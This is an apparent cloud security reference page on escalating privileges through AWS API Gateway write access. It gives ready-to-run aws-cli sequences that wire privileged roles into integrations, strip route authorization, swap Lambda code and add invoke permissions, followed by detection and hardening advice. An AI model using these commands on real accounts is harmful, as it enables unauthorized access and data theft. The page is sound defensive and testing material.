---
cstg_id: CSTG-AWS-API-GATEWAY-PRIVESC
title: "AWS Api Gateway - Privilege Escalation"
provider: aws
service: api-gateway
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - apigateway:POST
  - apigateway:PUT
  - apigateway:PATCH
  - apigateway:GET
  - iam:PassRole
  - lambda:AddPermission
  - lambda:UpdateFunctionCode
tools:
  - aws-cli
  - boto3
  - pacu
  - pmapper
  - cloudsplaining
references:
  - "https://docs.aws.amazon.com/apigateway/latest/developerguide/permissions.html"
  - "https://docs.aws.amazon.com/apigateway/latest/developerguide/integrating-api-with-aws-services-lambda.html"
  - "https://docs.aws.amazon.com/apigateway/latest/developerguide/getting-started-aws-proxy.html"
  - "https://docs.aws.amazon.com/apigateway/latest/developerguide/integrating-api-with-aws-services-s3.html"
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
license: CC BY-SA 4.0
---

## Summary

This page covers privilege escalation and lateral movement that becomes possible when a compromised principal holds write access to Amazon API Gateway (the `apigateway:POST/PUT/PATCH` family), often combined with `iam:PassRole` and write access to integration backends such as Lambda. Assume the breach has already happened: the attacker holds valid AWS credentials with some API Gateway control-plane permissions and wants to convert that into higher effective privilege.

The recurring escalation primitive is **integration credentials**: an `AWS`/`AWS_PROXY` integration runs under a role that API Gateway assumes (the integration `credentials` field). If a principal can create or modify an integration and pass a more privileged role to it, every (potentially unauthenticated) invocation of that endpoint executes AWS actions with that role's permissions. API Gateway thus becomes a `PassRole`-driven, internet-reachable confused deputy. Two further primitives - tampering with authorizers to bypass auth, and pivoting through a backend Lambda the attacker can modify - are also covered.

This is a privilege-escalation page; the Exploitation section is organized as one subsection per permission that enables a path.

## Prerequisites

- Valid credentials (assumed breach) with one or more API Gateway write actions (`apigateway:POST`, `apigateway:PUT`, `apigateway:PATCH`) plus `apigateway:GET` to enumerate.
- For role-passing paths: `iam:PassRole` permitting at least one role whose trust policy allows `apigateway.amazonaws.com`.
- For backend-pivot paths: write access to the integrated backend (e.g. `lambda:UpdateFunctionCode`, `lambda:AddPermission`).
- Inventory of APIs, routes, integrations, authorizers, and integration roles (see [enumeration](../02-services/aws-api-gateway-enum.md)).

## Enumeration

```bash
REGION=us-east-1
# Existing integrations and the roles they already assume
aws apigateway get-integration --rest-api-id $API --resource-id $RES \
  --http-method GET --region $REGION         # note 'credentials' (role ARN)

# Which roles can be passed to API Gateway? Look for trust on apigateway.amazonaws.com
aws iam get-role --role-name some-role \
  --query 'Role.AssumeRolePolicyDocument'

# What can the current principal do here?
aws iam simulate-principal-policy \
  --policy-source-arn <caller-arn> \
  --action-names apigateway:PUT apigateway:POST iam:PassRole lambda:UpdateFunctionCode
```

Identify a target role: one with a trust policy permitting `apigateway.amazonaws.com` (or for which the attacker can also create/modify the trust) and with permissions beyond the attacker's own.

## Misconfigurations & Findings

- **`iam:PassRole` scoped to `Resource: "*"`** alongside `apigateway:PUT/POST`, allowing an arbitrary privileged role to be wired into an integration.
- **Pre-existing high-privilege integration roles** (e.g. roles with broad `dynamodb:*`, `s3:*`, or `sts:AssumeRole`) attached to publicly reachable routes.
- **Greedy/proxy AWS-service integrations** (e.g. direct S3 or DynamoDB proxy) that can be repointed to other resources by editing the integration `uri`/path-override.
- **Routes left or set to `authorizationType: NONE`** by a write-capable attacker, exposing the abusive integration to anyone.
- **Backend Lambdas modifiable by the caller** while API Gateway holds invoke permission - editing the code changes what the (often more privileged) Lambda execution role does.
- **Authorizers that can be deleted/detached** (`UpdateMethod` / `DeleteAuthorizer`) to strip authentication.

## Exploitation

### apigateway:PUT

`apigateway:PUT` (with `apigateway:GET`) lets a principal overwrite an existing method's integration. Repoint an existing route's integration to a privileged AWS-service action while passing a powerful role, then invoke the route to execute that action with the role's permissions. Combined with `iam:PassRole`, this is the core confused-deputy escalation:

```bash
# Overwrite a method integration to call an AWS service with a privileged role
aws apigateway put-integration \
  --rest-api-id $API --resource-id $RES --http-method GET \
  --type AWS \
  --integration-http-method POST \
  --uri "arn:aws:apigateway:$REGION:dynamodb:action/Scan" \
  --credentials "arn:aws:iam::111122223333:role/privileged-apigw-role" \
  --region $REGION

aws apigateway create-deployment --rest-api-id $API --stage-name prod --region $REGION
# Now invoking the endpoint runs DynamoDB Scan as the privileged role
curl -s "https://$API.execute-api.$REGION.amazonaws.com/prod/<path>"
```

The same applies to S3 (`s3:GetObject`/`PutObject` proxy), SNS/SQS publish, `sts` actions, or any AWS service integration the role permits.

### apigateway:POST

`apigateway:POST` creates new resources, methods, authorizers, deployments, API keys, and (via `create-rest-api`/`importrestapi`) entire APIs. The escalation path mirrors PUT but builds the abusive endpoint from scratch so it does not disturb existing routes:

```bash
# Create a new resource + method with no auth, integrated to a service action under a privileged role
PARENT=$(aws apigateway get-resources --rest-api-id $API --region $REGION \
  --query 'items[?path==`/`].id' --output text)
NEWRES=$(aws apigateway create-resource --rest-api-id $API \
  --parent-id $PARENT --path-part pwn --region $REGION --query id --output text)

aws apigateway put-method --rest-api-id $API --resource-id $NEWRES \
  --http-method GET --authorization-type NONE --region $REGION

aws apigateway put-integration --rest-api-id $API --resource-id $NEWRES \
  --http-method GET --type AWS --integration-http-method POST \
  --uri "arn:aws:apigateway:$REGION:dynamodb:action/Scan" \
  --credentials "arn:aws:iam::111122223333:role/privileged-apigw-role" \
  --region $REGION

aws apigateway create-deployment --rest-api-id $API --stage-name prod --region $REGION
```

`create-api-key` + `create-usage-plan-key` can also mint usable keys for key-gated APIs.

### apigateway:PATCH

`apigateway:PATCH` updates existing resources via JSON-patch operations. Two notable abuses:

- **Strip authorization:** patch a method to remove its authorizer / set `authorizationType` to `NONE`, exposing a previously protected route (which may itself run under a privileged integration role).

```bash
aws apigateway update-method --rest-api-id $API --resource-id $RES \
  --http-method GET --region $REGION \
  --patch-operations op=replace,path=/authorizationType,value=NONE \
                     op=replace,path=/apiKeyRequired,value=false
```

- **Repoint integration credentials/URI:** patch the integration's `/credentials` to a more privileged role, or `/uri` to a different backend, then redeploy.

### iam:PassRole

`iam:PassRole` is the enabler for every integration-credentials path above. With write access to API Gateway and `PassRole` over a role trusted by `apigateway.amazonaws.com`, the attacker attaches that role as integration `credentials`. The privilege gained equals the passed role's permissions - so an overbroad `PassRole` (especially `Resource: "*"`) directly determines blast radius. Always enumerate which roles the caller may pass and pick the most privileged one whose trust policy admits API Gateway.

### lambda:UpdateFunctionCode

When a route's `AWS_PROXY` integration targets a Lambda the attacker can modify, `lambda:UpdateFunctionCode` lets the attacker replace the function body. The function then executes under its (often more privileged) Lambda execution role on every invocation, and the attacker can read environment secrets, call AWS APIs as the execution role, or exfiltrate data - reachable through the public endpoint.

```bash
aws lambda update-function-code --function-name backendFn \
  --zip-file fileb://payload.zip --region $REGION
curl -s "https://$API.execute-api.$REGION.amazonaws.com/prod/path"   # triggers attacker code
```

### lambda:AddPermission

To make a Lambda invokable by an API Gateway integration the attacker just created, an `AWS_PROXY` integration needs a resource-policy statement on the function granting `apigateway.amazonaws.com` invoke rights. `lambda:AddPermission` lets the attacker add that statement, wiring an existing privileged Lambda to a new unauthenticated route:

```bash
aws lambda add-permission --function-name privilegedFn \
  --statement-id apigw-pwn --action lambda:InvokeFunction \
  --principal apigateway.amazonaws.com \
  --source-arn "arn:aws:execute-api:$REGION:111122223333:$API/*/GET/pwn" \
  --region $REGION
```

Invoking the new route then runs the privileged function under its execution role.

## Detection & Logging

- **CloudTrail (management events, `eventSource: apigateway.amazonaws.com`):** `PutIntegration`, `UpdateIntegration`, `PutMethod`, `UpdateMethod`, `CreateResource`, `CreateDeployment`, `CreateRestApi`, `ImportRestApi`, `CreateAuthorizer`/`DeleteAuthorizer`, `CreateApiKey`. The `requestParameters` on `PutIntegration`/`UpdateIntegration` capture the integration `type`, `uri`, and **`credentials` role ARN** - the single highest-value signal that a role is being wired into an endpoint.
- **`iam.amazonaws.com` events:** A `PassRole` is recorded against the API Gateway write call (visible in CloudTrail as part of the authorization context); alert on PassRole of privileged roles to `apigateway.amazonaws.com`.
- **`lambda.amazonaws.com` events:** `AddPermission` granting `apigateway.amazonaws.com`, and `UpdateFunctionCode` on functions fronted by API Gateway.
- **Data-plane:** Subsequent abuse appears as `AssumeRole`-less direct service calls attributed to the integration role, and in stage **access logs** as invocations of the new/altered route. Enable access logging to correlate.
- **GuardDuty:** May flag the integration role suddenly calling unusual services, or anomalous IAM/Lambda modification behaviour.
- High-fidelity alert: a single principal performing `PutIntegration`/`PutMethod authorizationType=NONE` + `CreateDeployment` in sequence.

## Remediation & Hardening

- Scope `iam:PassRole` narrowly - never `Resource: "*"`; restrict passable roles by ARN and constrain `iam:PassedToService` to required services. This breaks the integration-credentials escalation.
- Treat `apigateway:PUT/POST/PATCH` as privileged; grant only to deployment pipelines, and separate authoring from production deploy.
- Keep integration `credentials` roles least-privileged - scoped to the exact backend action and resource, never broad `dynamodb:*`/`s3:*`/`sts:AssumeRole`.
- Lock down role trust policies: only roles that genuinely need it should trust `apigateway.amazonaws.com`.
- Restrict `lambda:AddPermission` and `lambda:UpdateFunctionCode`; protect function code with code signing and deployment controls.
- Enable access and execution logging on every stage; alert on `PutIntegration` with a `credentials` field and on methods changed to `authorizationType: NONE`.
- Use SCPs / permission boundaries to deny attaching high-privilege roles to integrations, and require change to flow through reviewed IaC rather than direct API calls.

## Tools

- **aws-cli / boto3** - the integration/method/role manipulation above.
- **Pacu** - AWS exploitation framework with modules for API Gateway enumeration and IAM privilege-escalation discovery.
- **pmapper** - graphs IAM relationships to find PassRole-based paths through API Gateway integrations.
- **cloudsplaining** - flags `iam:PassRole` + service-write combinations and overprivileged roles usable as integration credentials.

## References

- [API Gateway permissions reference](https://docs.aws.amazon.com/apigateway/latest/developerguide/permissions.html)
- [API Gateway Lambda integration](https://docs.aws.amazon.com/apigateway/latest/developerguide/integrating-api-with-aws-services-lambda.html)
- [Set up Lambda proxy integration](https://docs.aws.amazon.com/apigateway/latest/developerguide/getting-started-aws-proxy.html)
- [API Gateway as an Amazon S3 / AWS service proxy](https://docs.aws.amazon.com/apigateway/latest/developerguide/integrating-api-with-aws-services-s3.html)
- [Granting a user permission to pass a role (iam:PassRole)](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html)
- [Rhino Security Labs - AWS privilege escalation methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [hackingthe.cloud - IAM privilege escalation](https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/)
